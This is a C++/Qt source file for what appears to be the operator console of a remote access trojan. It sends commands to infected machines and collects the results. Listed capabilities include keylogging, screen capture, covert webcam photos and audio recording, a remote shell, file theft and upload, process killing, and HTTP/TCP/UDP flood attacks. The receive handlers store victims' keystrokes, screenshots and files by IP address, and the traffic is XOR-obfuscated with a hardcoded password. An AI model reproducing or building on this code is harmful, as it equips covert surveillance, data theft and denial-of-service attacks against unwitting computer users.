#include"netmanager.h"
#include "tool.h"
#include <QImage>
#include <QDir>
#include <QMessageBox>
#include "zlib/zlib.h"
#include "zlib/zconf.h"
#include <fstream>

#include <QPixmapCache>



/*
order:

1: 系统版本
2: CPU信息
3: 内存总量
4: 内存使用率
5: 是否存在摄像头
6: 计算机名
7: 用户名
8: 下载
9：上传
10: CPU使用率
11: 获得上次按键的时间，用于判断离开时间
12：标识符

20：命令行
21：关闭命令行

30：查看文件列表
31：删除文件
32：文件重命名（移动）
33：文件复制粘贴
34：从指定的网站下载文件
35：接收文件
36：上传文件
37：运行指定程序

40：开启键盘记录
41：关闭键盘记录

50：进程查看
51：杀死进程

60：屏幕截图
61：拍照

70：录音
71：停止录音

80：停止Dos
81：http DOS
82：tcp DOS
83：UDP DOS


90：断开连接
91：关机
92：静音
93：退出程序




*/



netManager::netManager(SOCKET s) {
    keylogwindows = nullptr;
    screenwinodws = nullptr;
    terminalwindows = nullptr;
    voicewindows = nullptr;
    processwindows = nullptr;

    sClient = s;
    finishFlag = 0;
    int nZero = 0;
    setsockopt(sClient,SOL_SOCKET,SO_SNDBUF,(char *)&nZero, sizeof(nZero));
    setsockopt(sClient, SOL_SOCKET, SO_RCVBUF, (char *)&nZero, sizeof(nZero));

    //修改主ui界面
    connect(this,SIGNAL(signalAddLog(QString,int)), tool::m, SLOT(addLog(QString,int)));
    connect(this,SIGNAL(signalDelInfo(SOCKET)), tool::m, SLOT(delInfo(SOCKET)));
    connect(this,SIGNAL(signalSetInfo(SOCKET,int,QString)), tool::m, SLOT(setInfo(SOCKET,int,QString)));

    //通过指针修改功能页面
    //如果使用槽的话，在netmanager线程中，窗口还未初始化
    //如果在netmanager中初始化窗口，窗口上的按钮就不能用了


}

netManager::~netManager() {
    disconnect(this,SIGNAL(signalAddLog(QString,int)), tool::m, SLOT(addLog(QString,int)));
    disconnect(this,SIGNAL(signalDelInfo(SOCKET)), tool::m, SLOT(delInfo(SOCKET)));
    disconnect(this,SIGNAL(signalSetInfo(SOCKET,int,QString)), tool::m, SLOT(setInfo(SOCKET,int,QString)));

//    finishNet();

    cleanup();

    if(keylogwindows!=nullptr){
        keylogwindows->close();
    }
    if(screenwinodws!=nullptr){
        screenwinodws->close();
    }
    if(terminalwindows!=nullptr){
        terminalwindows->close();
    }
    if(voicewindows!=nullptr){
        voicewindows->close();
    }
    if(filewindows!=nullptr){
        filewindows->close();
    }
    if(processwindows!=nullptr){
        processwindows->close();
    }
//    delete[] keylogwindows;
//    delete[] screenwinodws;
//    delete[] terminalwindows;
//    delete[] voicewindows;
//    delete[] filewindows;
//    delete[] processwindows;
    keylogwindows = nullptr;
    screenwinodws = nullptr;
    terminalwindows = nullptr;
    voicewindows = nullptr;
    filewindows = nullptr;
    processwindows = nullptr;
//    QMessageBox::about(nullptr, "清理", "~delete");



}

void netManager::start() {
    state = true;
    _time64(&lastTime);
    std::thread t2(std::bind(&netManager::myRecv, this));
    std::thread t3(std::bind(&netManager::detect, this));
    t2.detach();
    t3.detach();
}


void netManager::finishNet() {
    state = false;//通过该变量结束检测进程和recv进程
    if(finishFlag==0){
        finishFlag++;
        if(voicewindows!=nullptr){
            voicewindows->state=0;//通过该变量结束播放进程
        }

        emit signalDelInfo(sClient);
        emit signalAddLog(tool::GetAddressBySocket(sClient)+ "中断连接",1);
        if (sClient != 0) {
            closesocket(sClient);  //关闭这个TCP网络通信连接
        }
        tool::mut->lock();
        bool f = tool::storeList->removeOne(this);
        tool::mut->unlock();


        tool::deleteQueue->push(this);//加入待释放的列表，自己不能直接释放自己
    }



}

void netManager::myRecv() {

    QString title = tool::GetAddressBySocket(sClient);
    int  nRecv = 0;  //声明一个从网络接收到的数据字节长度
    char buff[20];
    int tmpi = 0;//tmp int
    long long tmpll;
    char flagBuff[15] = { 0 };
    int i = 0;//for循环里的
    short order = 0;
    short isCompress = 0;
    int len = 0;//表示主控端发过来的数据的大小
    char* originMem=nullptr, *zipMem=nullptr;
    char* data=nullptr;
    int hasRecvd =0;//表示本次已接收到的数据
    unsigned long ul1,ul2;
    QString filename,path;
    int zipSize=0,originSize=0;
    mfile tmpfile;
    mvoice tmpvoice;
    QImage image;
    QPixmap img;
    FILE* fp;
    QDir dir;

    unsigned long outSize=0;
    while (state && finishFlag==0 && tool::isQuit==false) {
        nRecv = recv(sClient, buff, 20, 0);
        if (nRecv <=0 ) {
            finishNet();
            break;
        }

        if (nRecv == 20)
        {
            len = ((int)buff[0] + 256) % 256;
            len += (((int)buff[1] + 256) % 256) * 0x100;
            len += (((int)buff[2] + 256) % 256) * 0x100 * 0x100;
            len += (((int)buff[3] + 256) % 256) * 0x100 * 0x100 * 0x100;

            for (i = 0; i < 14; i++) {
                flagBuff[i] = buff[i + 4];
            }
            flagBuff[14] = 0;
            if (strcmp(flagBuff, "CTF{e/j-9'8zH}") != 0) {
                emit signalAddLog(title+":密码不正确",4);

                finishNet();
                break;
            }
            if (len > 1000000000)continue;//不可能发送1GB大小的指令


            order = ((short)buff[18] + 256) % 256;
            isCompress = ((short)buff[19] + 256) % 256;
            data = new char[len + 1];

            hasRecvd=0;
            while(hasRecvd<len && state && finishFlag==0 && tool::isQuit==false){
                nRecv = recv(sClient, data+hasRecvd, len-hasRecvd, 0);
                hasRecvd+=nRecv;

            }                                                   //通过循环来接收完整数据，如果存在慢速dos的话，会在detect中 中断连接

            if (hasRecvd != len){
                std::cout<<"hasRecvd != len"<<std::endl;
                continue;
            }                                                   //接收到的数据和约定接收的不一致，可能是接收到一半，对方中断连接

            data[len] = 0;
            _time64(&lastTime);                                 //接收到有效数据，记录时间，用于detect

            if(isCompress){                                     //返回的是压缩数据
                for (tmpi = 0, i = 0; i < 4; i++) {
                    tmpi+=((data[i]+256) % 256)*tool::pow(0x100,i);
                }
                zipSize = tmpi;                                    //压缩的数据大小
                for (tmpi = 0, i = 0; i < 4; i++) {
                    tmpi+=((data[i+4]+256) % 256)*tool::pow(0x100,i);
                }
                originSize = tmpi;                                  //原始的数据大小
                zipMem = (char *)(data+8);

                originMem = new char[originSize];               //new 了，需要delete

                outSize=originSize;
                uncompress((unsigned char *)originMem, &outSize, (unsigned char *)zipMem, zipSize);

            }

//            emit signalAddLog("recv order:"+QString::number(order),4);
            if(order<20){
                for(i=0;i<len;i++){
                    data[i]=data[i]^len;
                }

            }
            switch (order) {
            case 1:
                // 系统版本
                emit signalSetInfo(sClient,4,QString::fromUtf8(data));
                break;
            case 2: // CPU信息
                emit signalSetInfo(sClient,5,QString::fromUtf8(data));
                break;
            case 3: // 内存总量
                emit signalSetInfo(sClient,7,QString::fromUtf8(data));
                break;
            case 4: // 内存使用率
                emit signalSetInfo(sClient,8,QString::fromUtf8(data));
                break;
            case 5: // 是否存在摄像头
                emit signalSetInfo(sClient,11,QString::fromUtf8(data));
                break;
            case 6: // 计算机名
                emit signalSetInfo(sClient,2,QString::fromUtf8(data));
                break;
            case 7: // 用户名
                emit signalSetInfo(sClient,3,QString::fromUtf8(data));
                break;
            case 8: // 下载
                emit signalSetInfo(sClient,10,QString::fromUtf8(data));
                break;
            case 9: //上传
                emit signalSetInfo(sClient,9,QString::fromUtf8(data));
                break;
            case 10: // CPU使用率
                emit signalSetInfo(sClient,6,QString::fromUtf8(data));
                break;
            case 11:// 获得上次按键的时间，用于判断离开时间
                if(len<1){
                    break;
                }
                tmpi = atoi(data);
                emit signalSetInfo(sClient,14,tool::translateTime(tmpi));
                break;
            case 12:// 获得标识符
                if(len<32)break;
                name=QString::fromUtf8(data);
                emit signalSetInfo(sClient,15,QString::fromUtf8(data));

            case 20: //命令行
                if(len<=4){
                    break;
                }
                for(i=0;i<len;i++){
                    data[i]=data[i]^12322;
                }
//                if(terminalwindows!=nullptr){
//                    terminalwindows->addResult(QString::fromUtf8(data));
//                }
                emit signalAddTermResult(QString::fromUtf8(data));

                break;
            case 21:break; //关闭命令行
            case 30: //文件列表

                if(len<53){//最小头文件长度53
                    break;
                }
                tmpfile.isRoot= data[0];

                for (tmpll = 0,i = 0; i < 8; i++) {
                    tmpll+=((data[i+1]+0x100)%0x100)*tool::pow(0x100,i);
                }

                tmpfile.fileTotalSize = tmpll;

                for (tmpll = 0, i = 0; i < 8; i++) {
                    tmpll+=((data[i+9]+0x100)%0x100)*tool::pow(0x100,i);

                }
                tmpfile.fileFreeSize = tmpll;

                for (tmpi = 0, i = 0; i < 4; i++) {
                    tmpi+=((data[i+17]+0x100)%0x100)*tool::pow(0x100,i);

                }
                tmpfile.diskType = tmpi;

                for (tmpi = 0, i = 0; i < 4; i++) {
                    tmpi+=((data[i+21]+0x100)%0x100)*tool::pow(0x100,i);

                }
                tmpfile.attrib = tmpi;

                for (tmpll = 0, i = 0; i < 8; i++) {
                   tmpll+=((data[i+25]+0x100)%0x100)*tool::pow(0x100,i);

                }
                tmpfile.time_create = tmpll;

                for (tmpll = 0, i = 0; i < 8; i++) {
                    tmpll+=((data[i+33]+0x100)%0x100)*tool::pow(0x100,i);

                }
                tmpfile.time_access = tmpll;

                for (tmpll = 0, i = 0; i < 8; i++) {
                    tmpll+=((data[i+41]+0x100)%0x100)*tool::pow(0x100,i);

                }
                tmpfile.time_write = tmpll;

                for (tmpi = 0, i = 0; i < 4; i++) {
                    tmpi+=((data[i+49]+0x100)%0x100)*tool::pow(0x100,i);

                }
                tmpfile.size = tmpi;
                for(i=53;i<len;i++){
                    data[i]=data[i]^(len-53);                   //解密
                }
                tmpfile.fileName = QString::fromUtf8(data+53);

//                if(filewindows!=nullptr){
//                    filewindows->addFile(tmpfile);
//                }

                emit signalAddFilelist(tmpfile);

                break;

            case 35://客户端上传文件
                if(len<0)break;
                for (ul1 = 0, i = 0; i < 4; i++) {
                    ul1+=((data[i]+0x100)%0x100)*tool::pow(0x100,i);
                }//文件大小

                filename="";
                for(i=4;i<len;i++){
                    filename+=data[i]^len;//文件名
                }

                emit signalAddLog(tool::GetAddressBySocket(sClient)+"：上传文件:"+filename,2);

                path = tool::GetIPBySocket(sClient)+ QDir::separator()+"recvFile";

                dir.mkpath(path);
                path = path+QDir::separator()+filename;

                fp = fopen(path.toStdString().c_str(),"wb");


                if (fp == nullptr){
                    path = filename;
                    fp = fopen(path.toStdString().c_str(), "wb");
                }
                if (fp == nullptr)break;




                delete[] data;

                data = new char[1024];
                ul2 = 0;
                while ( state && tool::isQuit==false) {
                    nRecv = recv(sClient, data, 1024, 0);
                    for (i = 0; i < nRecv; i++) {
                        data[i] = data[i] ^ len;
                    }
                    ul2 += nRecv;
                    if (ul2 < ul1) {

                        fwrite(data, sizeof(char), nRecv, fp);
                    }
                    else {
                        fwrite(data, sizeof(char), ul1+nRecv-ul2, fp);
                        break;
                    }
                    if (ul2 >= ul1)break;

                }
                fclose(fp);

                emit signalAddLog(tool::GetAddressBySocket(sClient)+"：上传文件保存至:"+path,3);

                break;

            case 40://键盘记录
                if(len<=0){
                    break;
                }
                for(i=0;i<len;i++){
                    data[i]=data[i]^12322;
                }
//                if(keylogwindows!=nullptr){
//                    keylogwindows->addKeylog(QString::fromUtf8(data));
//                }

                emit signalAddKeylog(QString::fromUtf8(data));

                break;
            case 50: //进程查看
                if(len<5){

                    break;
                }

                for (tmpi = 0, i = 0; i < 4; i++) {
                    tmpi+=((data[i]+256) % 256)*tool::pow(0x100,i);
                }//l: pid
                for(i=4;i<len;i++){
                    data[i]=data[i]^tmpi;//解密
                }


//                if(processwindows!=nullptr){
//                    processwindows->addProcess(tmpi,QString::fromUtf8(data+4));
//                }

                emit signalAddProcess(tmpi,QString::fromUtf8(data+4));

                break;

            case 60: //屏幕截图
            case 61://拍照
                filename = savePicture(originMem,originSize,order);
//                if(screenwinodws!=nullptr){
//                    screenwinodws->addImage(filename);
//                }

                emit signalAddImage(filename);
                break;
            case 70://录音

                tmpvoice.voiceMem=originMem;
                tmpvoice.voiceSize=originSize;
                if(voicewindows!=nullptr){
                    voicewindows->voiceQueue.push(tmpvoice);
                }

                break;//录音

            default: break;

            }

            delete[] data;
            data=nullptr;
            if(isCompress && order!= 70 && order!=60 && order!=61){//正常来说originMem会在使用后在对应程序中释放
                delete[] originMem;                                 //但是如果不按规则来的话，可能存在内存泄露。因此要加以判断
                originMem=nullptr;
            }

        }

    }

    finishFlag++;
}

void netManager::mySend() {

    int l = 0,i=0 ,l2=0;
    char p[] = "CTF{e/j-9'8zH}";
    char *data=nullptr;
    std::string filename,upload_path,tmpname;
    morder tmporder;

    mutex.lock();

    while(state && finishFlag==0 && tool::isQuit==false && orderQueue.size() > 0) {
        if (orderQueue.try_pop(tmporder)) {
            if(tmporder.orderType==36){//文件发送给客户端

                filename="";
                upload_path="";
                l = strlen(tmporder.orderMem);
                for (i = 0; i < l; i++) {
                    if (tmporder.orderMem[i] == '|')break;
                    filename += tmporder.orderMem[i];//获得文件全路径
                }

                for (i++; i < l + 1; i++) {
                    if (tmporder.orderMem[i] == 0)break;
                    upload_path += tmporder.orderMem[i];//上传到的目录
                }

                FILE *fp = fopen(filename.c_str(), "rb");
                if (fp == nullptr){
                    delete[] data;
                    data=nullptr;
                    delete[] tmporder.orderMem;
                    tmporder.orderMem=nullptr;

                    emit signalAddLog("打开文件"+QString::fromStdString(filename)+"失败",4);
                    continue;
                }
                signalAddLog("上传文件："+tool::GetIPBySocket(sClient)+":"+QString::fromStdString(filename),2);

                fseek (fp, 0, SEEK_END);   ///将文件指针移动文件结尾
                l2=ftell (fp); ///求出当前文件指针距离文件开始的字节数
//                    fclose(fp);



                if(filename.find_last_of('/')>0){//除掉文件全路径中的路径
                    tmpname=filename.substr(filename.find_last_of('/')+1);
                }
                tmpname=tmpname+"|"+upload_path;

                l=4+tmpname.length();       // l:头的data的数据长度

                data=new char[20+l];//头+文件大小、(文件名+|+目录)


                for (i = 0; i < 4; i++) {
                    data[i] = l % 0x100;
                    l /= 0x100;
                }
                data[4] = tmporder.orderType;
                for (i = 0; i < 14; i++) {
                    if (i < strlen(p)) {
                        data[i + 5] = p[i];
                    }
                    else {
                        data[i + 5] = 0x00;
                    }
                }
                data[19] = tmporder.orderType;

                for (i = 0; i < 4; i++) {           //发送文件大小
                    data[20 + i] = l2 % 0x100;
                    l2 /= 0x100;
                }

                l=4+tmpname.length();       // l:头的data的数据长度,也是秘钥

                for (i = 0; i < tmpname.length(); i++) {
                    data[24 + i] = tmpname.at(i)^l;
                }


                send(sClient, data, 20+4+tmpname.length(), 0);          //发送文件大小和目录名和文件名

                delete[] data;

//                    fp = fopen(filename.c_str(), "rb");
                rewind(fp);

                data=new char[1024];
                int read=0;
//                    int sendNum=0;
                while(state && finishFlag==0){//不断读取文件发送
                    read = fread(data, sizeof(char), sizeof(data), fp);
                    for(i=0;i<read;i++){
                        data[i]=data[i]^l;
                    }
                    send(sClient,data,read,0);
//                        sendNum+=read;
                    if(feof(fp))break;
                }
                fclose(fp);
                signalAddLog("文件上传完成："+tool::GetIPBySocket(sClient),3);
//                    printf("send num :%d\n",sendNum);
//                    std::cout<<std::endl;

            }else{//其他指令
                data = new char[20 + tmporder.orderSize];
                l = tmporder.orderSize;
                for (i = 0; i < 4; i++) {
                    data[i] = l % 0x100;
                    l /= 0x100;
                }
                data[4] = tmporder.orderType;
                for (i = 0; i < 14; i++) {
                    if (i < strlen(p)) {
                        data[i + 5] = p[i];
                    }
                    else {
                        data[i + 5] = 0x00;
                    }
                }
                data[19] = tmporder.orderType;
                for (i = 0; i < tmporder.orderSize; i++) {
                    data[20 + i] = tmporder.orderMem[i];
                }

                send(sClient, data, 20+tmporder.orderSize, 0);
            }

            delete[] data;
            data=nullptr;
            delete[] tmporder.orderMem;
            tmporder.orderMem=nullptr;
        }
    }

    mutex.unlock();


}

void netManager::detect() {

    __time64_t t,t_SendHeart;
    QString tmp = tool::GetAddressBySocket(sClient);
    _time64(&t_SendHeart);
//    tool::m->addLog(tmp+"detect",4);
    while (state && finishFlag==0 && tool::isQuit==false ) {
        _time64(&t);
        if(t-t_SendHeart>60){
            OrderStruct tmpOrder;
            tmpOrder.orderMem=nullptr;
            tmpOrder.orderSize=0;
            tmpOrder.orderType=rand()%14;
            orderQueue.push(tmpOrder);//定时刷新系统信息

            addOrder();
            t_SendHeart=t;
        }

        if (t - lastTime > 300) {//超过5分钟未收到消息
            emit signalAddLog(tmp+"超时",2);
            finishNet();
            break;;
        }
        Sleep(2000);
    }
//    tool::m->addLog(tmp+"close detect" ,4);
    finishFlag++;

}

void netManager::cleanup() {
    morder tmporder;
    mvoice tmpvoice;

    while (orderQueue.size() > 0) {
        if (orderQueue.try_pop(tmporder)) {
            delete[] tmporder.orderMem;
            tmporder.orderMem=nullptr;
        }
    }

    while (voicewindows!=nullptr && voicewindows-> voiceQueue.size() > 0) {
        if (voicewindows->voiceQueue.try_pop(tmpvoice)) {
            delete[] tmpvoice.voiceMem;
            tmpvoice.voiceMem=nullptr;
        }
    }

}

void netManager::addOrder(){
    std::thread t1(std::bind(&netManager::mySend, this));
    t1.detach();
}

QString netManager::savePicture(char * buff, int outSize,int order){
    QDir dir;
    QString fdirname = tool::GetIPBySocket(sClient);
    QString cdirname ;

    if(order==60)cdirname="screen";
    else cdirname="photo";
    dir.mkpath(fdirname+"/"+cdirname);

    __time64_t t;
    _time64(&t);
    std::string filename = "./"+fdirname.toStdString() +"/"+cdirname.toStdString()+"/"+std::to_string(t)+"_"+std::to_string(rand()%100)+".bmp";
    FILE *fp = fopen(filename.c_str(), "w+b");
    fwrite(buff, 1, outSize, fp);
    fclose(fp);
    delete[] buff;
    buff=nullptr;
//    std::cout<<filename<<std::endl;
    return QString::fromStdString(filename);


}




